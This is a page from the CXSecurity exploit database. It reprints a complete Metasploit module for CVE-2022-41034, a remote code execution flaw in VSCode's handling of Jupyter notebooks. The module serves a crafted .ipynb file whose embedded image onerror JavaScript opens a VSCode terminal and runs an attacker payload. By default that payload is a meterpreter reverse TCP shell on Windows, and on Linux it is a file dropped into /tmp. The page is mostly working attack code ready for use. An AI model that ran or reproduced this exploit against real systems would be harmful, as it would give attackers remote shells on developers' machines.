---
title: VSCode ipynb Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024060030
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-12
fetch_date: 2025-10-06T16:54:21.833226
---

# VSCode ipynb Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **VSCode ipynb Remote Code Execution** **2024.06.11**  Credit:  **[h00die](https://cxsecurity.com/author/h00die/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-41034](https://cxsecurity.com/cveshow/CVE-2022-41034/ "Click to see CVE-2022-41034")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpServer
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'VSCode ipynb Remote Development RCE',
'Description' => %q{
VSCode when opening an Jupyter notebook (.ipynb) file bypasses the trust model.
On versions v1.4.0 - v1.71.1, its possible for the Jupyter notebook to embed
HTML and javascript, which can then open new terminal windows within VSCode.
Each of these new windows can then execute arbitrary code at startup.
During testing, the first open of the Jupyter notebook resulted in pop-ups
displaying errors of unable to find the payload exe file. The second attempt
at opening the Jupyter notebook would result in successful exeuction.
Successfully tested against VSCode 1.70.2 on Windows 10.
},
'License' => MSF\_LICENSE,
'Author' => [
'h00die', # metasploit module
'Zemnmez'
],
'References' => [
['URL', 'https://github.com/google/security-research/security/advisories/GHSA-pw56-c55x-cm9m'],
['CVE', '2022-41034'],
['URL', 'https://github.com/andyhsu024/CVE-2022-41034']
],
'DisclosureDate' => '2022-11-22',
'Privileged' => false,
'Arch' => ARCH\_CMD,
'Stance' => Stance::Aggressive,
'Payload' => { 'BadChars' => '&"' },
'Targets' => [
[
'Windows',
{
'Platform' => 'win',
'DefaultOptions' => {
'PAYLOAD' => 'cmd/windows/http/x64/meterpreter/reverse\_tcp'
}
}
],
[
'Linux File-Dropper',
{
'Platform' => 'linux',
'DefaultOptions' => {
'PAYLOAD' => 'linux/x64/meterpreter/reverse\_tcp'
}
}
]
],
'DefaultTarget' => 0,
'DefaultOptions' => {
'WfsDelay' => 3\_600, # 1hr
'URIPATH' => 'project.ipynb'
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
# on windows it will say the final payload can't be found
# however, it is, seems to be a timing issue, 2nd exploit attempt
# works perfectly
'Reliability' => [REPEATABLE\_SESSION, FIRST\_ATTEMPT\_FAIL],
'SideEffects' => [SCREEN\_EFFECTS]
}
)
)
register\_options(
[
OptString.new('PAYLOAD\_FILENAME', [ false, 'Name of the payload file - only required when exploiting on Linux.', 'shell.sh' ]),
OptString.new('WRITABLE\_DIR', [ false, 'Name of the writable directory containing the payload file - required when exploiting on Linux .', '/tmp/' ]),
]
)
end
def check
CheckCode::Unsupported
end
def exploit
unless datastore['URIPATH'].end\_with? '.ipynb'
fail\_with(Failure::BadConfig, 'URIPATH must end in .ipynb for exploit to be successful')
end
print\_status('Starting up web service...')
start\_service
sleep(datastore['WFSDELAY'])
end
def on\_request\_uri(cli, request)
super unless request.uri.end\_with? datastore['URIPATH']
if target['Platform'] == 'win'
config = { 'executable' => 'cmd.exe', 'args' => "/c #{payload.raw}" }
else
config = { 'executable' => "/#{datastore['WRITABLE\_DIR']}/#{datastore['PAYLOAD\_FILENAME']}" }
end
pload = JSON.dump({ 'config' => config })
pload = CGI.escape(pload).gsub('+', '%20') # XXX not sure if this is needed or not, but it works
ipynb = %|{
"cells": [
{
"cell\_type": "markdown",
"metadata": {},
"source": [
"<img src=a onerror=\\"let q = document.createElement('a');q.href='command:workbench.action.terminal.new?#{pload}';document.body.appendChild(q);q.click()\\"/>"
]
}
]}|
send\_response(cli, ipynb, {
'Connection' => 'close',
'Pragma' => 'no-cache',
'Access-Control-Allow-Origin' => '\*'
})
print\_status("Sent #{datastore['URIPATH']} to #{cli.peerhost}")
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060030)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top